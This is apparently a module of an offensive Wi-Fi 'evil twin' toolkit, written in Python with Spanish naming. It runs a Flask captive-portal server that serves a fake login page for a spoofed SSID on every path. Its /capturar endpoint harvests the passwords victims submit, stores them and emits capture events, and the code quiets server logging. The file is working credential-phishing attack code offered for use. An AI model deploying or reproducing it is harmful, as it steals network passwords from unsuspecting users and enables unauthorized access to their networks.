from __future__ import annotations

import errno
import logging
import socket
import sys
import threading
from typing import TYPE_CHECKING

from flask import Flask, render_template, request
from werkzeug.serving import make_server

from evil_twin_events import EventBus, EventoCaptura
from evil_twin_renderer import PortalRenderer
from evil_twin_store import CapturaStore

if TYPE_CHECKING:
    from core.log_sistema import LogSistema

logging.getLogger("werkzeug").setLevel(logging.ERROR)

_flask_cli = sys.modules.get("flask.cli")
if _flask_cli and hasattr(_flask_cli, "show_server_banner"):
    _flask_cli.show_server_banner = lambda *_: None


class EvilTwinError(Exception):
    pass


class PortOcupadoError(EvilTwinError):
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        super().__init__(
            f"Puerto {port} en {host!r} ya está ocupado.\n"
            f"  • Cambia el puerto: EvilTwinServer(port=8080)\n"
            f"  • Libera el proceso: sudo fuser -k {port}/tcp"
        )


class ServidorYaActivoError(EvilTwinError):
    pass


def _verificar_puerto(host: str, port: int) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((host, port))
        except OSError as exc:
            if exc.errno == errno.EADDRINUSE:
                raise PortOcupadoError(host, port) from exc
            raise


class EvilTwinServer:

    DEFAULT_HOST = "0.0.0.0"
    DEFAULT_PORT = 80

    def __init__(
        self,
        ssid: str = "Red_Publica",
        host: str = DEFAULT_HOST,
        port: int = DEFAULT_PORT,
        log: LogSistema | None = None,
        bus: EventBus | None = None,
        renderer: PortalRenderer | None = None,
        store: CapturaStore | None = None,
    ) -> None:
        self.ssid = ssid
        self.host = host
        self.port = port

        self._log      = log
        self._bus      = bus or EventBus()
        self._renderer = renderer or PortalRenderer()
        self._store    = store or CapturaStore()

        self._srv:  make_server | None    = None
        self._hilo: threading.Thread | None = None
        self._lock  = threading.Lock()

        self._app = self._crear_app()

    def iniciar(self) -> threading.Thread:
        with self._lock:
            if self.esta_vivo():
                raise ServidorYaActivoError(
                    f"El servidor ya está activo en {self.host}:{self.port}."
                )
            _verificar_puerto(self.host, self.port)
            self._srv = make_server(self.host, self.port, self._app, threaded=True)
            self._hilo = threading.Thread(
                target=self._srv.serve_forever,
                daemon=True,
                name="evil-twin-flask",
            )
            self._hilo.start()

        self._log_info(f"Portal cautivo activo en {self.host}:{self.port}")
        return self._hilo

    def detener(self, timeout: float = 5.0) -> bool:
        with self._lock:
            if self._srv is None:
                return True
            self._srv.shutdown()
            self._srv.server_close()
            self._srv = None

        if self._hilo:
            self._hilo.join(timeout=timeout)
            vivo = self._hilo.is_alive()
            self._hilo = None
            if vivo:
                self._log_warning("El hilo del servidor no terminó a tiempo.")
                return False

        self._log_info("Portal cautivo detenido limpiamente.")
        return True

    def reiniciar(self, timeout: float = 5.0) -> threading.Thread:
        self.detener(timeout=timeout)
        return self.iniciar()

    def esta_vivo(self) -> bool:
        return self._hilo is not None and self._hilo.is_alive()

    @property
    def capturas(self) -> list[str]:
        return self._store.snapshot()

    @property
    def total_capturas(self) -> int:
        return self._store.total()

    @property
    def bus(self) -> EventBus:
        return self._bus

    def _crear_app(self) -> Flask:
        app = Flask(__name__)

        @app.route("/", defaults={"path": ""})
        @app.route("/<path:path>")
        def portal_cautivo(path: str) -> str:
            try:
                return render_template("index.html", ssid=self.ssid)
            except Exception:
                return self._renderer.portal(self.ssid)

        @app.route("/capturar", methods=["POST"])
        def capturar() -> str:
            password = request.form.get("password", "").strip()
            if password:
                total = self._store.agregar(password)
                self._log_info(f"Credencial capturada — SSID: {self.ssid}")
                self._bus.emitir(EventoCaptura(
                    ssid=self.ssid,
                    password=password,
                    total=total,
                ))
            return self._renderer.cierre()

        return app

    def _log_info(self, mensaje: str) -> None:
        if self._log:
            self._log.info(mensaje, "EvilTwin")

    def _log_warning(self, mensaje: str) -> None:
        if self._log:
            self._log.warning(mensaje, "EvilTwin")

    def __enter__(self) -> EvilTwinServer:
        self.iniciar()
        return self

    def __exit__(self, *_: object) -> None:
        self.detener()


def iniciar_servidor(
    ssid: str = "Red_Publica",
    log: LogSistema | None = None,
    bus: EventBus | None = None,
) -> EvilTwinServer:
    servidor = EvilTwinServer(ssid=ssid, log=log, bus=bus)
    servidor.iniciar()
    return servidor
